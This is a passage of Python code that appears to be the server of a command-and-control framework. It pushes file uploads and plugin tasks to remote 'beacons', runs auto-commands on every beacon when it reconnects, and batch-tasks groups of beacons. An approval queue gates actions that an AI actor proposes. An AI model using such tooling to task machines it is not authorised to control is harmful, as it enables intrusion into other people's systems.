        data = base64.b64decode(b64)
        plugin = self._platform_plugin(beacon_id, "ldd", "wdd")
        task = self.tasks.create_task(
            beacon_id,
            plugin=plugin,
            args={"op": "write", "path": path, "mode": mode, "content_b64": b64, "offset": offset},
            risk="R2",
            display=f"上传分块 {path}",
        )
        return {"task": task, "path": path, "offset": offset, "bytes": len(data)}

    def _upload_file(self, args: dict) -> dict:
        beacon_id = str(args.get("beacon_id", ""))
        self._require_online_beacon(beacon_id)
        path = str(args.get("path", ""))
        b64 = str(args.get("content_b64", ""))
        data = base64.b64decode(b64)
        artifact_id = new_id("art_")
        self.store.write_bytes(f"artifacts/{artifact_id}.bin", data)
        plugin = self._platform_plugin(beacon_id, "ldd", "wdd")
        task = self.tasks.create_task(
            beacon_id,
            plugin=plugin,
            args={"op": "write", "path": path, "mode": "start", "content_b64": b64, "offset": 0},
            risk="R2",
            display=f"上传 {path}",
        )
        return {"task": task, "artifact_id": artifact_id, "bytes": len(data)}

    def _set_global_auto(self, args: dict) -> dict:
        record = {
            "tasks": self._normalize_auto_tasks(args.get("tasks") or []),
            "updated_at": now_iso(),
        }
        self.store.write_json("auto/global.json", record)
        self.store.event("auto.global_updated", {"tasks": len(record["tasks"])})
        return record

    def _normalize_auto_tasks(self, tasks) -> list[dict]:
        out = []
        for item in tasks or []:
            if isinstance(item, str):
                out.append({"plugin": item.strip(), "args": {}, "command": item.strip()})
            elif isinstance(item, dict):
                plugin = str(item.get("plugin") or item.get("command") or "").strip()
                if plugin:
                    out.append({
                        "plugin": plugin,
                        "args": item.get("args") or {},
                        "command": str(item.get("command") or plugin),
                    })
        return out

    def _list_groups(self) -> list[dict]:
        out = []
        for directory in self.store.list_dirs("groups"):
            record = self.store.read_json(f"groups/{directory.name}/group.json")
            if record:
                out.append(record)
        return sorted(out, key=lambda item: item.get("created_at", ""))

    def _create_group(self, args: dict) -> dict:
        name = str(args.get("name", "")).strip()
        if not name:
            raise RuntimeErrorBase("group name is required")
        group_id = new_id("grp_")
        record = {
            "id": group_id,
            "name": name,
            "beacon_ids": list(dict.fromkeys(args.get("beacon_ids") or [])),
            "batch_tasks": self._normalize_auto_tasks(args.get("batch_tasks") or args.get("auto_tasks") or []),
            "created_at": now_iso(),
            "updated_at": now_iso(),
        }
        self.store.write_json(f"groups/{group_id}/group.json", record)
        self.store.event("group.created", {"group_id": group_id, "name": name})
        return record

    def _update_group(self, args: dict) -> dict:
        group_id = str(args.get("group_id", ""))
        record = self.store.read_json(f"groups/{group_id}/group.json")
        if not record:
            raise RuntimeErrorBase("group not found")
        if "name" in args:
            name = str(args.get("name", "")).strip()
            if not name:
                raise RuntimeErrorBase("group name is required")
            record["name"] = name
        if "beacon_ids" in args:
            record["beacon_ids"] = list(dict.fromkeys(args.get("beacon_ids") or []))
        if "batch_tasks" in args or "auto_tasks" in args:
            record["batch_tasks"] = self._normalize_auto_tasks(args.get("batch_tasks") or args.get("auto_tasks") or [])
            record.pop("auto_tasks", None)
        record["updated_at"] = now_iso()
        self.store.write_json(f"groups/{group_id}/group.json", record)
        self.store.event("group.updated", {"group_id": group_id})
        return record

    def _delete_group(self, group_id: str) -> dict:
        record = self.store.read_json(f"groups/{group_id}/group.json")
        if not record:
            raise RuntimeErrorBase("group not found")
        self.store.delete(f"groups/{group_id}")
        self.store.event("group.deleted", {"group_id": group_id})
        return {"id": group_id, "deleted": True}

    def _global_auto_tasks(self) -> list[dict]:
        record = self.store.read_json("auto/global.json", default={"tasks": []})
        return self._normalize_auto_tasks(record.get("tasks") or [])

    def _auto_tasks_for_beacon(self, beacon_id: str) -> list[dict]:
        # Global automatic commands execute for every Beacon on reconnect,
        # regardless of group membership.
        return self._global_auto_tasks()

    def _set_beacon_auto(self, args: dict) -> dict:
        beacon_id = str(args.get("beacon_id", ""))
        record = self.store.read_json(f"beacons/{beacon_id}/beacon.json")
        if not record:
            raise RuntimeErrorBase("beacon not found")
        record["auto_tasks"] = self._normalize_auto_tasks(args.get("auto_tasks") or [])
        record["auto_enabled"] = bool(args.get("enabled", True))
        record["auto_updated_at"] = now_iso()
        self.store.write_json(f"beacons/{beacon_id}/beacon.json", record)
        return {"id": beacon_id, "auto_tasks": record["auto_tasks"], "auto_enabled": record["auto_enabled"]}

    def _run_beacon_auto(self, args: dict) -> dict:
        beacon_id = str(args.get("beacon_id", ""))
        tasks = self._normalize_auto_tasks(args.get("auto_tasks") or [])
        if not tasks:
            tasks = self._auto_tasks_for_beacon(beacon_id)
        if not tasks:
            raise RuntimeErrorBase("no auto tasks configured")
        state = self.tasks.arm_auto_sequence(beacon_id, tasks)
        return {"beacon_id": beacon_id, "tasks": len(tasks), "state": state}

    def _batch_dispatch_group(self, args: dict) -> dict:
        group_id = str(args.get("group_id", ""))
        group = self.store.read_json(f"groups/{group_id}/group.json")
        if not group:
            raise RuntimeErrorBase("group not found")
        tasks = self._normalize_auto_tasks(args.get("tasks") or group.get("batch_tasks") or group.get("auto_tasks") or [])
        if not tasks:
            raise RuntimeErrorBase("no tasks configured for group")
        created = []
        skipped = []
        for beacon_id in group.get("beacon_ids") or []:
            try:
                self._require_online_beacon(beacon_id)
            except Exception:
                skipped.append(beacon_id)
                continue
            for template in tasks:
                task = self.tasks.create_task(
                    beacon_id,
                    plugin=template["plugin"],
                    args=template.get("args") or {},
                    display=template.get("command") or template["plugin"],
                    risk="R1",
                )
                created.append(task)
        return {"group_id": group_id, "created": created, "skipped": skipped}

    def _create_approval(self, action: str, args: dict, actor: str = "ai") -> dict:
        approval_id = new_id("appr_")
        record = {
            "id": approval_id,
            "action": action,
            "args": args,
            "actor": actor,
            "status": "pending",
            "created_at": now_iso(),
        }
        self.store.write_json(f"approvals/{approval_id}.json", record)
        self.store.event("approval.created", {"approval_id": approval_id, "action": action})
        return record

    def _list_approvals(self, status: str | None = None) -> list[dict]:
        out = []
        for path in self.store.list_files("approvals", "*.json"):
            record = self.store.read_json(f"approvals/{path.name}")
            if record and (not status or status == "all" or record.get("status") == status):
                out.append(record)
        return sorted(out, key=lambda item: item.get("created_at", ""), reverse=True)

    async def _approve_all_approvals(self, approver_actor: str = "human") -> dict:
        pending = self._list_approvals(status="pending")
        results = []
        for record in pending:
            try:
                results.append(await self._approve_approval(record["id"], approver_actor))
            except Exception as exc:
                results.append({"id": record.get("id"), "status": "error", "error": str(exc)})
        return {"approved": len([r for r in results if r.get("status") == "approved"]), "results": results}

    def _reject_all_approvals(self) -> dict:
        pending = self._list_approvals(status="pending")
        results = []
        for record in pending:
            try:
                results.append(self._reject_approval(record["id"]))
            except Exception as exc:
                results.append({"id": record.get("id"), "status": "error", "error": str(exc)})
        return {"rejected": len([r for r in results if r.get("status") == "rejected"]), "results": results}

    async def _approve_approval(self, approval_id: str, approver_actor: str = "human") -> dict:
        record = self.store.read_json(f"approvals/{approval_id}.json")
        if not record:
            raise RuntimeErrorBase("approval not found")
        if record.get("status") != "pending":
            return record
        if approver_actor == "ai_approval" and record.get("actor") == "ai_approval":
            raise RuntimeErrorBase("an AI approval token cannot approve its own operation")
        try:
            result = await self._dispatch(record["action"], record.get("args") or {}, actor=approver_actor)
        except Exception as exc:
            record["status"] = "failed"
            record["error"] = str(exc) or "operation failed"
            record["resolved_at"] = now_iso()
            self.store.write_json(f"approvals/{approval_id}.json", record)
            self.store.event("approval.failed", {"approval_id": approval_id, "action": record["action"], "error": record["error"]})
            raise
        record["status"] = "approved"
        record["result"] = result
        record["resolved_at"] = now_iso()
        self.store.write_json(f"approvals/{approval_id}.json", record)
        self.store.event("approval.approved", {"approval_id": approval_id, "action": record["action"]})
        return record

    def _reject_approval(self, approval_id: str, suggestion: str = "", actor: str = "human") -> dict:
        record = self.store.read_json(f"approvals/{approval_id}.json")
        if not record:
            raise RuntimeErrorBase("approval not found")
        record["status"] = "rejected"
        record["suggestion"] = suggestion
        record["rejected_by"] = actor
        record["resolved_at"] = now_iso()
        self.store.write_json(f"approvals/{approval_id}.json", record)
        self.store.event("approval.rejected", {"approval_id": approval_id, "action": record["action"], "suggestion": suggestion, "actor": actor})
        return record
